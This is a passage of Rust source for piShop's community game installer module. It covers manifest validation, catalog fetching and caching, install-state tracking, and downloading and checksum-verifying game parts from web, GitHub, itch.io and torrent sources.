//! Community: game installers people write in piShop's repository
//! (`community/<game>/manifest.json` + `install.sh`, bundled into
//! `community/index.json`) for games piShop can't set up by itself — a
//! console game behind a wrapper, a decompilation that needs the player's own
//! ROM. Each manifest declares the game's parts: files from the web (a plain
//! link, an itch.io upload, a GitHub release), a torrent, or a file the user
//! picks on the device. piShop downloads them (Transfers), checks them
//! against the manifest's checksums, extracts what's compressed into the
//! game's folder, runs the script that arranges everything there, and then
//! creates the Steam shortcut, so the game ends up in Games like any other.
//!
//! The script runs in a sandbox (bubblewrap): no network (every download is
//! declared and done by piShop), the user's files hidden, only the game's
//! folder writable and the parts readable. It is shown before it runs and
//! pinned by its SHA-256 from the index. Pull requests adding games are
//! reviewed (Copilot + maintainers) against `community/README.md`.
//!
//! An install's state lives in `<data>/community/installs.json`; the game's
//! data in the library under `cm-<game>` (`library::community_key`).

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use std::process::Stdio;
use std::sync::{LazyLock, Mutex};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use anyhow::{Context, anyhow, bail};
use axum::extract::{Path as UrlPath, Query};
use axum::response::Response;
use axum::routing::{get, post};
use axum::{Json, Router};
use serde::{Deserialize, Deserializer, Serialize};
use serde_json::{Value, json};
use sha2::Digest;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::sync::watch;

use crate::install::{self, InstallState, Stage as InstallStage, reply};
use crate::{direct, library, localfs, log, steamclient, torrent, tr};

/// piShop's repository: the community folder and its issues.
const REPO: &str = "anarqz/pishop";
pub const DEFAULT_URL: &str = "https://raw.githubusercontent.com/anarqz/pishop/main/community/index.json";
/// The issue form for troubleshooting a community game.
const ISSUE_FORM: &str = "community.yml";

// ---------- the manifest ----------

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Index {
    #[serde(default)]
    pub format: u32,
    #[serde(default)]
    pub generated: String,
    #[serde(default)]
    pub games: Vec<Value>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Manifest {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub platform: String,
    /// Bumped whenever the manifest or its script changes.
    #[serde(default)]
    pub revision: u32,
    #[serde(default)]
    pub summary: String,
    /// The guide: what this is and what to expect.
    #[serde(default)]
    pub description: String,
    /// Notes for SteamOS: known issues and their workarounds.
    #[serde(default)]
    pub steamos: Vec<String>,
    #[serde(default)]
    pub authors: Vec<String>,
    #[serde(default)]
    pub wrapper: Option<Wrapper>,
    #[serde(default)]
    pub art: Art,
    #[serde(default)]
    pub requirements: Requirements,
    pub parts: Vec<Part>,
    pub install: Install,
    pub launch: Launch,
    /// Launch-option toggles offered in Games → Patches for this game.
    #[serde(default)]
    pub patches: Vec<PatchDef>,
    #[serde(default)]
    pub updated: String,
}

/// What runs the game (an emulation layer, a launcher, a port).
#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Wrapper {
    pub name: String,
    #[serde(default)]
    pub version: String,
    #[serde(default)]
    pub url: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Art {
    /// The game on SteamGridDB: artwork, and the key of its troubleshooting issues.
    #[serde(default)]
    pub sgdb_id: Option<u64>,
    #[serde(default, deserialize_with = "lenient_string")]
    pub steam_appid: Option<String>,
    #[serde(default)]
    pub cover: Option<String>,
    #[serde(default)]
    pub hero: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Requirements {
    #[serde(default)]
    pub ram_gb: Option<u32>,
    #[serde(default)]
    pub note: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Part {
    /// Lowercase letters, digits, - and _: the script sees it as PISHOP_PART_<ID>.
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    /// launcher, game, data or other (how the UI labels it).
    #[serde(default)]
    pub role: String,
    pub source: PartSource,
    #[serde(default)]
    pub size: Option<u64>,
    /// Accepted checksums (several when more than one dump is fine).
    #[serde(default)]
    pub checksums: Checksums,
    /// Extract this archive into the game's folder, under this subfolder ("" = its root).
    #[serde(default)]
    pub extract: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(tag = "type", rename_all = "lowercase")]
pub enum PartSource {
    Http {
        urls: Vec<String>,
        /// Saved under this name.
        file: String,
    },
    Itch {
        page: String,
        #[serde(default)]
        upload_id: Option<u64>,
        file: String,
    },
    Github {
        repo: String,
        #[serde(default = "latest")]
        tag: String,
        /// Regular expression for the asset's name.
        asset: String,
    },
    Torrent {
        /// .torrent files, tried in order.
        #[serde(default)]
        urls: Vec<String>,
        #[serde(default)]
        magnet: Option<String>,
        /// Regular expression: only the torrent's files whose path matches.
        #[serde(default)]
        files: Option<String>,
    },
    /// Not public: the user points at their own copy (a ROM, a game disc).
    User {
        #[serde(default)]
        hint: String,
        /// Lowercase extensions the file picker shows, e.g. [".z64", ".n64"].
        #[serde(default)]
        extensions: Vec<String>,
    },
}

fn latest() -> String {
    "latest".into()
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Checksums {
    #[serde(default, deserialize_with = "one_or_many", skip_serializing_if = "Vec::is_empty")]
    pub sha1: Vec<String>,
    #[serde(default, deserialize_with = "one_or_many", skip_serializing_if = "Vec::is_empty")]
    pub sha256: Vec<String>,
    #[serde(default, deserialize_with = "one_or_many", skip_serializing_if = "Vec::is_empty")]
    pub md5: Vec<String>,
}

impl Checksums {
    fn is_empty(&self) -> bool {
        self.sha1.is_empty() && self.sha256.is_empty() && self.md5.is_empty()
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Install {
    /// The script's file name in the repository.
    pub script: String,
    /// Its text (the index carries it).
    #[serde(default)]
    pub source: String,
    #[serde(default)]
    pub sha256: String,
    /// About how much the installed game takes, in bytes.
    #[serde(default)]
    pub disk: Option<u64>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Launch {
    /// The executable, relative to the game's folder.
    pub exe: String,
    #[serde(default)]
    pub options: String,
    /// "proton" (a Windows game) or "native" (a Linux build).
    #[serde(default = "proton_runtime")]
    pub runtime: String,
    /// The Proton to prefer, when Steam offers it (e.g. "proton_experimental").
    #[serde(default)]
    pub proton: Option<String>,
}

fn proton_runtime() -> String {
    "proton".into()
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct PatchDef {
    pub id: String,
    pub title: String,
    #[serde(default)]
    pub about: String,
    /// Environment set before %command% while the patch is on.
    #[serde(default)]
    pub env: BTreeMap<String, String>,
}

fn one_or_many<'de, D: Deserializer<'de>>(d: D) -> Result<Vec<String>, D::Error> {
    Ok(match Value::deserialize(d)? {
        Value::String(s) => vec![s],
        Value::Array(a) => a.into_iter().filter_map(|v| v.as_str().map(String::from)).collect(),
        _ => Vec::new(),
    })
}

fn lenient_string<'de, D: Deserializer<'de>>(d: D) -> Result<Option<String>, D::Error> {
    Ok(match Value::deserialize(d)? {
        Value::String(s) if !s.is_empty() => Some(s),
        Value::Number(n) => Some(n.to_string()),
        _ => None,
    })
}

fn is_slug(s: &str, max: usize) -> bool {
    !s.is_empty() && s.len() <= max && s.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_')
}

/// A path inside the game's folder: relative, no `..`.
fn inside(p: &str) -> bool {
    let p = Path::new(p);
    !p.is_absolute() && p.components().all(|c| matches!(c, Component::Normal(_) | Component::CurDir))
}

pub fn sha256_hex(bytes: &[u8]) -> String {
    sha2::Sha256::digest(bytes).iter().map(|b| format!("{b:02x}")).collect()
}

/// What piShop needs from a manifest before it trusts it.
pub fn validate(m: &Manifest) -> anyhow::Result<()> {
    if !is_slug(&m.id, 64) {
        bail!("id {:?}: lowercase letters, digits, - and _ only", m.id);
    }
    if m.name.trim().is_empty() {
        bail!("{}: no name", m.id);
    }
    if m.parts.is_empty() {
        bail!("{}: no parts", m.id);
    }
    let mut seen = HashSet::new();
    for p in &m.parts {
        if !is_slug(&p.id, 32) || !seen.insert(p.id.as_str()) {
            bail!("{}: part id {:?} is invalid or repeated", m.id, p.id);
        }
        if let Some(x) = &p.extract
            && !inside(x)
        {
            bail!("{}: part {} extracts outside the game's folder", m.id, p.id);
        }
        let https = |u: &str| u.starts_with("https://");
        match &p.source {
            PartSource::Http { urls, file } => {
                if urls.is_empty() || !urls.iter().all(|u| https(u)) || direct::safe_name(file) != *file || file.is_empty() {
                    bail!("{}: part {}: https links and a plain file name", m.id, p.id);
                }
            }
            PartSource::Itch { page, file, .. } => {
                if !https(page) || direct::safe_name(file) != *file || file.is_empty() {
                    bail!("{}: part {}: an https itch.io page and a file name", m.id, p.id);
                }
            }
            PartSource::Github { repo, asset, .. } => {
                if repo.split('/').count() != 2 || regex::Regex::new(asset).is_err() {
                    bail!("{}: part {}: repo owner/name and an asset pattern", m.id, p.id);
                }
            }
            PartSource::Torrent { urls, magnet, files } => {
                if urls.is_empty() && magnet.is_none() || !urls.iter().all(|u| https(u)) {
                    bail!("{}: part {}: https .torrent links or a magnet", m.id, p.id);
                }
                if files.as_deref().is_some_and(|f| regex::Regex::new(f).is_err()) {
                    bail!("{}: part {}: bad files pattern", m.id, p.id);
                }
            }
            PartSource::User { .. } => {}
        }
    }
    if !inside(&m.launch.exe) || m.launch.exe.trim().is_empty() {
        bail!("{}: launch.exe must be a path inside the game's folder", m.id);
    }
    if !["proton", "native"].contains(&m.launch.runtime.as_str()) {
        bail!("{}: launch.runtime is proton or native", m.id);
    }
    if m.install.source.trim().is_empty() {
        bail!("{}: the index has no script", m.id);
    }
    if sha256_hex(m.install.source.as_bytes()) != m.install.sha256.to_lowercase() {
        bail!("{}: the script doesn't match its SHA-256", m.id);
    }
    for p in &m.patches {
        if !is_slug(&p.id, 32) || p.env.keys().any(|k| k.is_empty() || !k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')) {
            bail!("{}: patch {:?} is invalid", m.id, p.id);
        }
    }
    Ok(())
}

// ---------- the catalog ----------

pub fn catalog_url() -> String {
    let c = crate::catalog::config();
    if c.community_url.trim().is_empty() { DEFAULT_URL.to_string() } else { c.community_url.trim().to_string() }
}

struct Cached {
    at: Instant,
    url: String,
    games: Vec<Manifest>,
    warning: Option<String>,
}

static CATALOG: LazyLock<tokio::sync::Mutex<Option<Cached>>> = LazyLock::new(Default::default);
const FRESH: Duration = Duration::from_secs(600);

fn dir() -> PathBuf {
    crate::data_dir().join("community")
}

static HTTP: LazyLock<reqwest::Client> = LazyLock::new(|| {
    reqwest::Client::builder().connect_timeout(Duration::from_secs(15)).timeout(Duration::from_secs(60)).user_agent("piShop").build().expect("http client")
});

/// The index's text: a local file (for testing a manifest on the device) or the web.
async fn fetch_index(url: &str) -> anyhow::Result<Vec<u8>> {
    if url.starts_with('/') {
        return Ok(std::fs::read(url)?);
    }
    let r = HTTP.get(url).send().await.context(tr!("the community catalog didn't answer", "o catálogo da comunidade não respondeu"))?;
    if !r.status().is_success() {
        bail!(tr!("the community catalog answered {}", "o catálogo da comunidade respondeu {}", r.status()));
    }
    Ok(r.bytes().await?.to_vec())
}

/// Games in the index that are valid; the others are logged and left out.
fn parse_index(bytes: &[u8]) -> anyhow::Result<Vec<Manifest>> {
    let idx: Index = serde_json::from_slice(bytes).context(tr!("the community catalog isn't valid JSON", "o catálogo da comunidade não é um JSON válido"))?;
    let mut out = Vec::new();
    for g in idx.games {
        match serde_json::from_value::<Manifest>(g.clone()).map_err(anyhow::Error::from).and_then(|m| validate(&m).map(|_| m)) {
            Ok(m) => out.push(m),
            Err(e) => log!("comunidade: {} ignorado: {e:#}", g["id"].as_str().unwrap_or("?")),
        }
    }
    Ok(out)
}

/// The catalog, from cache for ten minutes; the last good copy when the web fails.
pub async fn catalog(fresh: bool) -> anyhow::Result<(Vec<Manifest>, Option<String>)> {
    let url = catalog_url();
    let mut cache = CATALOG.lock().await;
    if let Some(c) = cache.as_ref()
        && !fresh
        && c.url == url
        && c.at.elapsed() < FRESH
    {
        return Ok((c.games.clone(), c.warning.clone()));
    }
    let saved = dir().join("index.json");
    let (games, warning) = match fetch_index(&url).await.and_then(|b| parse_index(&b).map(|g| (g, b))) {
        Ok((games, bytes)) => {
            let _ = std::fs::create_dir_all(dir());
            let _ = std::fs::write(&saved, bytes);
            (games, None)
        }
        Err(e) => {
            log!("comunidade: catálogo {url}: {e:#}");
            let old = std::fs::read(&saved).ok().and_then(|b| parse_index(&b).ok()).ok_or(e)?;
            (old, Some(tr!("Offline: showing the catalog from the last time it loaded.", "Sem conexão: mostrando o catálogo da última vez que carregou.")))
        }
    };
    *cache = Some(Cached { at: Instant::now(), url, games: games.clone(), warning: warning.clone() });
    Ok((games, warning))
}

async fn manifest(id: &str) -> anyhow::Result<Manifest> {
    catalog(false).await?.0.into_iter().find(|m| m.id == id).ok_or_else(|| anyhow!(tr!("this game isn't in the community catalog", "este jogo não está no catálogo da comunidade")))
}

/// The manifest as it was installed (patches read it later).
fn saved_manifest(id: &str) -> Option<Manifest> {
    std::fs::read(dir().join("manifests").join(format!("{id}.json"))).ok().and_then(|b| serde_json::from_slice(&b).ok())
}

/// Games → Patches: the toggles a community game's manifest offers.
pub fn patches_for(appid: u32) -> Vec<PatchDef> {
    library::all()
        .into_iter()
        .filter(|(k, e)| library::is_community_key(k) && e.install.as_ref().and_then(|s| s.appid) == Some(appid))
        .filter_map(|(k, _)| saved_manifest(k.trim_start_matches("cm-")))
        .flat_map(|m| m.patches)
        .collect()
}

// ---------- installs ----------

#[derive(Serialize, Deserialize, Clone, Copy, PartialEq, Eq, Debug)]
#[serde(rename_all = "snake_case")]
pub enum Stage {
    Downloading,
    Extracting,
    Preparing,
    Shortcut,
    Installed,
    Failed,
}

#[derive(Serialize, Deserialize, Clone, Copy, PartialEq, Eq, Debug)]
#[serde(rename_all = "snake_case")]
pub enum PartState {
    /// The user has to pick the file.
    Waiting,
    Downloading,
    /// Being copied from a game source (network storage) to the device.
    Copying,
    Verifying,
    Ready,
    Failed,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct PartRec {
    pub id: String,
    pub state: PartState,
    /// The file (a torrent's folder when it has several) once there.
    #[serde(default)]
    pub path: Option<String>,
    #[serde(default)]
    pub direct: Option<u64>,
    #[serde(default)]
    pub torrent: Option<String>,
    /// The user's own file, used where it is: piShop never deletes it.
    #[serde(default)]
    pub provided: bool,
    #[serde(default)]
    pub error: Option<String>,
    /// 0..1 while its checksum is computed.
    #[serde(default)]
    pub verify: f32,
    #[serde(default)]
    pub extracted: bool,
    /// Bytes, when known (GitHub assets resolve it at start).
    #[serde(default)]
    pub size: Option<u64>,
    /// The copy job bringing it from a game source.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub copy: Option<u64>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Record {
    pub id: String,
    pub manifest: Manifest,
    pub library: String,
    pub game_dir: String,
    /// Where the parts download to.
    pub downloads: String,
    pub tool: String,
    pub parts: Vec<PartRec>,
    pub stage: Stage,
    #[serde(default)]
    pub failed_at: Option<Stage>,
    #[serde(default)]
    pub error: Option<String>,
    /// What the current step is doing (the script says it with ::step).
    #[serde(default)]
    pub step: Option<String>,
    #[serde(default)]
    pub progress: Option<f32>,
    #[serde(default)]
    pub paused: bool,
    #[serde(default)]
    pub appid: Option<u32>,
    /// piShop created the game's folder (so cancelling may remove it).
    #[serde(default)]
    pub created_dir: bool,
    pub added: i64,
    #[serde(default)]
    pub finished: Option<i64>,
}

static RECORDS: LazyLock<Mutex<BTreeMap<String, Record>>> = LazyLock::new(|| {
    Mutex::new(std::fs::read(dir().join("installs.json")).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default())
});
/// Scripts running now, by game.
static SCRIPTS: LazyLock<Mutex<HashMap<String, watch::Sender<bool>>>> = LazyLock::new(Default::default);
/// Extraction jobs by (game, part).
static EXTRACTS: LazyLock<Mutex<HashMap<(String, String), u64>>> = LazyLock::new(Default::default);
/// Parts being checked or started now (one task each).
static BUSY: LazyLock<Mutex<HashSet<(String, String)>>> = LazyLock::new(Default::default);
/// Shortcuts being made now.
static SHORTCUTS: LazyLock<Mutex<HashSet<String>>> = LazyLock::new(Default::default);
/// Torrent parts as the engine last reported them: (done, total, speed, error).
static LIVE: LazyLock<Mutex<HashMap<String, (u64, u64, f64, Option<String>)>>> = LazyLock::new(Default::default);
/// The last lines of each game's script output.
static LOGS: LazyLock<Mutex<HashMap<String, VecDeque<String>>>> = LazyLock::new(Default::default);
const LOG_LINES: usize = 200;

fn now() -> i64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs() as i64).unwrap_or(0)
}

fn persist(map: &BTreeMap<String, Record>) {
    let _ = std::fs::create_dir_all(dir());
    let path = dir().join("installs.json");
    let tmp = path.with_extension("json.tmp");
    if let Ok(b) = serde_json::to_vec_pretty(map)
        && std::fs::write(&tmp, b).is_ok()
    {
        let _ = std::fs::rename(tmp, path);
    }
}

fn record(id: &str) -> Option<Record> {
    RECORDS.lock().unwrap().get(id).cloned()
}

fn change(id: &str, f: impl FnOnce(&mut Record)) {
    let mut map = RECORDS.lock().unwrap();
    if let Some(r) = map.get_mut(id) {
        f(r);
        persist(&map);
    }
}

/// Like `change`, for progress that changes often (not saved each time).
fn touch(id: &str, f: impl FnOnce(&mut Record)) {
    if let Some(r) = RECORDS.lock().unwrap().get_mut(id) {
        f(r);
    }
}

fn change_part(id: &str, part: &str, f: impl FnOnce(&mut PartRec)) {
    change(id, |r| {
        if let Some(p) = r.parts.iter_mut().find(|p| p.id == part) {
            f(p);
        }
    })
}

fn fail(id: &str, at: Stage, error: String) {
    log!("comunidade: {id} falhou em {at:?}: {error}");
    change(id, |r| {
        r.stage = Stage::Failed;
        r.failed_at = Some(at);
        r.error = Some(error);
        r.progress = None;
    });
}

fn log_line(id: &str, line: &str) {
    let mut logs = LOGS.lock().unwrap();
    let tail = logs.entry(id.to_string()).or_default();
    if tail.len() >= LOG_LINES {
        tail.pop_front();
    }
    tail.push_back(line.to_string());
}

fn log_tail(id: &str, n: usize) -> Vec<String> {
    if let Some(t) = LOGS.lock().unwrap().get(id) {
        return t.iter().skip(t.len().saturating_sub(n)).cloned().collect();
    }
    // After a restart: the end of the log file.
    std::fs::read_to_string(dir().join(id).join("install.log"))
        .map(|s| {
            let lines: Vec<&str> = s.lines().collect();
            lines[lines.len().saturating_sub(n)..].iter().map(|l| l.to_string()).collect()
        })
        .unwrap_or_default()
}

/// The supervisor: moves every install along, every second and a half.
pub fn start() {
    tokio::spawn(async {
        // Steam and the torrent engine come up first.
        tokio::time::sleep(Duration::from_secs(3)).await;
        loop {
            let ids: Vec<String> = RECORDS
                .lock()
                .unwrap()
                .values()
                .filter(|r| !matches!(r.stage, Stage::Installed | Stage::Failed))
                .map(|r| r.id.clone())
                .collect();
            for id in ids {
                if let Err(e) = advance(&id).await {
                    log!("comunidade: {id}: {e:#}");
                }
            }
            tokio::time::sleep(Duration::from_millis(1500)).await;
        }
    });
}

async fn advance(id: &str) -> anyhow::Result<()> {
    let Some(r) = record(id) else { return Ok(()) };
    match r.stage {
        Stage::Downloading => downloads(&r).await,
        Stage::Extracting => extracting(&r),
        Stage::Preparing => {
            if !SCRIPTS.lock().unwrap().contains_key(id) {
                let (tx, rx) = watch::channel(false);
                SCRIPTS.lock().unwrap().insert(id.to_string(), tx);
                let id = id.to_string();
                tokio::spawn(async move {
                    let result = run_script(&id, rx).await;
                    SCRIPTS.lock().unwrap().remove(&id);
                    match result {
                        Ok(true) => change(&id, |r| {
                            r.stage = Stage::Shortcut;
                            r.progress = None;
                            r.step = None;
                        }),
                        Ok(false) => {}
                        Err(e) => fail(&id, Stage::Preparing, format!("{e:#}")),
                    }
                });
            }
            Ok(())
        }
        Stage::Shortcut => {
            if SHORTCUTS.lock().unwrap().insert(id.to_string()) {
                let result = shortcut(id).await;
                SHORTCUTS.lock().unwrap().remove(id);
                if let Err(e) = result {
                    fail(id, Stage::Shortcut, format!("{e:#}"));
                }
            }
            Ok(())
        }
        Stage::Installed | Stage::Failed => Ok(()),
    }
}

fn spec<'a>(r: &'a Record, part: &str) -> Option<&'a Part> {
    r.manifest.parts.iter().find(|p| p.id == part)
}

fn owner(id: &str, part: &str) -> String {
    format!("{}/{part}", library::community_key(id))
}

/// A newer revision of the manifest, published while the install is still
/// downloading, is taken on: its new parts join (and download), the script,
/// launch and patches are the new ones; parts already there keep going as
/// they started. Not when a part the install has was taken out.
async fn adopt_newer(r: &Record) {
    let Ok((games, _)) = catalog(false).await else { return };
    let Some(m) = games.into_iter().find(|m| m.id == r.id) else { return };
    if m.revision <= r.manifest.revision || !r.parts.iter().all(|p| m.parts.iter().any(|x| x.id == p.id)) {
        return;
    }
    let added: Vec<String> = m.parts.iter().filter(|x| !r.parts.iter().any(|p| p.id == x.id)).map(|x| x.id.clone()).collect();
    log!("comunidade: {} passa para a revisão {} (partes novas: {added:?})", r.id, m.revision);
    change(&r.id, |rec| {
        let new: Vec<Part> = m.parts.iter().filter(|x| !rec.parts.iter().any(|p| p.id == x.id)).cloned().collect();
        for x in &new {
            rec.parts.push(PartRec {
                id: x.id.clone(),
                state: if matches!(x.source, PartSource::User { .. }) { PartState::Waiting } else { PartState::Downloading },
                path: None,
                direct: None,
                torrent: None,
                provided: false,
                error: None,
                verify: 0.0,
                extracted: false,
                size: x.size,
                copy: None,
            });
        }
        rec.manifest = m;
    });
}

/// Downloading: start what hasn't started, follow what runs, check what finished.
async fn downloads(r: &Record) -> anyhow::Result<()> {
    adopt_newer(r).await;
    let Some(r) = record(&r.id) else { return Ok(()) };
    let r = &r;
    for p in r.parts.iter().filter(|p| p.state == PartState::Copying) {
        copied(r, p);
    }
    let Some(r) = record(&r.id) else { return Ok(()) };
    let r = &r;
    for p in &r.parts {
        let Some(s) = spec(r, &p.id) else { continue };
        let busy = BUSY.lock().unwrap().contains(&(r.id.clone(), p.id.clone()));
        if busy || p.state != PartState::Downloading {
            continue;
        }
        if let Some(did) = p.direct {
            match direct::get(did) {
                Some(d) if d.state == direct::State::Done => verify_then_ready(&r.id, &p.id, PathBuf::from(&d.path), false),
                Some(d) if d.state == direct::State::Failed => change_part(&r.id, &p.id, |p| {
                    p.state = PartState::Failed;
                    p.error = d.error.clone();
                }),
                Some(d) if d.state == direct::State::Paused && !r.paused => direct::resume(did),
                Some(_) => {}
                // Gone from the list (removed by hand): start it again.
                None => change_part(&r.id, &p.id, |p| p.direct = None),
            }
        } else if let Some(hash) = &p.torrent {
            torrent_part(r, p, s, hash).await;
        } else if !r.paused {
            start_part(r, p, s);
        }
    }
    let Some(r) = record(&r.id) else { return Ok(()) };
    if let Some(p) = r.parts.iter().find(|p| p.state == PartState::Failed) {
        let name = spec(&r, &p.id).map(|s| s.name.clone()).unwrap_or_default();
        fail(&r.id, Stage::Downloading, format!("{name}: {}", p.error.clone().unwrap_or_default()));
    } else if r.parts.iter().all(|p| p.state == PartState::Ready) {
        let extract = r.manifest.parts.iter().any(|p| p.extract.is_some());
        change(&r.id, |r| {
            r.stage = if extract { Stage::Extracting } else { Stage::Preparing };
            r.progress = None;
        });
    }
    Ok(())
}

/// Starts downloading a part (in the background: some sources ask the web first).
fn start_part(r: &Record, p: &PartRec, s: &Part) {
    let key = (r.id.clone(), p.id.clone());
    if !BUSY.lock().unwrap().insert(key.clone()) {
        return;
    }
    let (id, part, spec, folder) = (r.id.clone(), p.id.clone(), s.clone(), PathBuf::from(&r.downloads).join(&p.id));
    tokio::spawn(async move {
        let result = begin(&id, &part, &spec, &folder).await;
        BUSY.lock().unwrap().remove(&key);
        match result {
            Ok(Some(done)) => verify_then_ready(&id, &part, done, false),
            Ok(None) => {}
            Err(e) => change_part(&id, &part, |p| {
                p.state = PartState::Failed;
                p.error = Some(format!("{e:#}"));
            }),
        }
    });
}

/// Some(file): it was already downloaded (an install started over), to check.
async fn begin(id: &str, part: &str, s: &Part, folder: &Path) -> anyhow::Result<Option<PathBuf>> {
    let owner = owner(id, part);
    let (source, file, size) = match &s.source {
        PartSource::Http { urls, file } => (direct::Source::Http { urls: urls.clone() }, file.clone(), s.size),
        PartSource::Itch { page, upload_id, file } => {
            (direct::Source::Itch { page: page.clone(), upload_id: *upload_id, file: Some(file.clone()) }, file.clone(), s.size)
        }
        PartSource::Github { repo, tag, asset } => {
            let (_, size, name) = direct::github_asset(repo, tag, asset).await?;
            change_part(id, part, |p| p.size = Some(size));
            (direct::Source::Github { repo: repo.clone(), tag: tag.clone(), asset: asset.clone() }, direct::safe_name(&name), Some(size).filter(|s| *s > 0))
        }
        PartSource::Torrent { urls, magnet, files } => {
            let hash = add_torrent(urls, magnet.as_deref(), files.as_deref(), folder).await?;
            change_part(id, part, |p| p.torrent = Some(hash));
            return Ok(None);
        }
        PartSource::User { .. } => {
            change_part(id, part, |p| p.state = PartState::Waiting);
            return Ok(None);
        }
    };
    let path = folder.join(&file);
    // Already downloaded (an install started over): just check it.
    if size.is_some_and(|s| std::fs::metadata(&path).is_ok_and(|m| m.len() == s)) {
        return Ok(Some(path));
    }
    let did = direct::add(source, &path, size, &owner)?;
    change_part(id, part, |p| {
        p.direct = Some(did);
        p.path = Some(path.display().to_string());
    });
    log!("comunidade: {id}/{part} baixando → {}", path.display());
    Ok(None)
}

/// Adds a torrent part to the engine, only the files the manifest asks for.
async fn add_torrent(urls: &[String], magnet: Option<&str>, files: Option<&str>, folder: &Path) -> anyhow::Result<String> {
    if !torrent::running() {
        bail!(tr!("the torrent engine isn't ready yet", "o motor de torrents ainda não está pronto"));
    }
    let mut body: Option<Vec<u8>> = None;
    let mut last = None;
    for u in urls {
        match HTTP.get(u).send().await.and_then(|r| r.error_for_status()) {
            Ok(r) => {
                body = Some(r.bytes().await?.to_vec());
                break;
            }
            Err(e) => last = Some(e),
        }
    }
    let body = match (body, magnet) {
        (Some(b), _) => b,
        (None, Some(m)) => m.as_bytes().to_vec(),
        (None, None) => bail!(tr!("couldn't get the .torrent: {}", "não foi possível baixar o .torrent: {}", last.map(|e| e.to_string()).unwrap_or_default())),
    };
    std::fs::create_dir_all(folder)?;
    let folder_s = folder.display().to_string();
    let mut q: Vec<(&str, &str)> = vec![("overwrite", "true"), ("output_folder", &folder_s)];
    if let Some(f) = files {
        q.push(("only_files_regex", f));
    }
    let r = HTTP
        .post(format!("http://127.0.0.1:{}/torrents", torrent::api_port()))
        .query(&q)
        .body(body)
        .timeout(Duration::from_secs(120))
        .send()
        .await?;
    let ok = r.status().is_success();
    let v: Value = r.json().await.unwrap_or(Value::Null);
    if !ok {
        bail!(v["human_readable"].as_str().or(v["error"].as_str()).map(String::from).unwrap_or_else(|| tr!("couldn't add the torrent", "falha ao adicionar o torrent")));
    }
    Ok(v["details"]["info_hash"].as_str().unwrap_or_default().to_lowercase())
}

async fn torrent_part(r: &Record, p: &PartRec, s: &Part, hash: &str) {
    let base = format!("http://127.0.0.1:{}/torrents/{hash}", torrent::api_port());
    let Ok(stats) = HTTP.get(format!("{base}/stats/v1")).timeout(Duration::from_secs(5)).send().await else { return };
    let Ok(v) = stats.json::<Value>().await else { return };
    let total = v["total_bytes"].as_u64().unwrap_or(0);
    let done = v["progress_bytes"].as_u64().unwrap_or(0);
    let speed = v["live"]["download_speed"]["mbps"].as_f64().unwrap_or(0.0) * 1024.0 * 1024.0;
    let error = v["error"].as_str().map(String::from);
    LIVE.lock().unwrap().insert(hash.to_string(), (done, total, speed, error.clone()));
    if let Some(e) = error {
        change_part(&r.id, &p.id, |p| {
            p.state = PartState::Failed;
            p.error = Some(e);
        });
        return;
    }
    if r.paused && v["state"].as_str() != Some("paused") {
        let _ = torrent::act(hash, "pause").await;
    }
    if !r.paused && v["state"].as_str() == Some("paused") && !v["finished"].as_bool().unwrap_or(false) {
        let _ = torrent::act(hash, "start").await;
    }
    if !v["finished"].as_bool().unwrap_or(false) {
        return;
    }
    // Done: stop sharing (the files are about to be extracted from) and find them.
    let _ = torrent::act(hash, "pause").await;
    let Ok(details) = HTTP.get(&base).send().await else { return };
    let Ok(d) = details.json::<Value>().await else { return };
    let out = PathBuf::from(d["output_folder"].as_str().unwrap_or(&r.downloads));
    let files: Vec<PathBuf> = d["files"]
        .as_array()
        .into_iter()
        .flatten()
        .filter(|f| f["included"].as_bool().unwrap_or(true))
        .filter_map(|f| {
            let parts: Vec<String> = f["components"].as_array()?.iter().filter_map(|c| c.as_str().map(String::from)).collect();
            Some(parts.iter().fold(out.clone(), |p, c| p.join(c)))
        })
        .filter(|p| !p.to_string_lossy().contains(".____padding_file"))
        .collect();
    let path = match files.as_slice() {
        [one] => one.clone(),
        _ => out,
    };
    let checks = !s.checksums.is_empty() && path.is_file();
    if checks {
        verify_then_ready(&r.id, &p.id, path, false);
    } else {
        change_part(&r.id, &p.id, |p| {
            p.state = PartState::Ready;
            p.path = Some(path.display().to_string());
        });
    }
}

/// Checks a part's file against the manifest's checksums (in the
/// background, with progress), then marks it ready. A user's file that
/// doesn't match goes back to waiting for another one.
fn verify_then_ready(id: &str, part: &str, path: PathBuf, provided: bool) {
    let Some(r) = record(id) else { return };
    let Some(s) = spec(&r, part).cloned() else { return };
    let key = (id.to_string(), part.to_string());
    if !BUSY.lock().unwrap().insert(key.clone()) {
        return;
    }
    change_part(id, part, |p| {
        p.state = PartState::Verifying;
        p.path = Some(path.display().to_string());
        p.provided = provided;
        p.verify = 0.0;
        p.error = None;
    });
    let (id, part) = (id.to_string(), part.to_string());
    tokio::spawn(async move {
        let sums = s.checksums.clone();
        let (pid, ppart, ppath) = (id.clone(), part.clone(), path.clone());
        let result = tokio::task::spawn_blocking(move || {
            check(&ppath, &sums, |f| {
                touch(&pid, |r| {
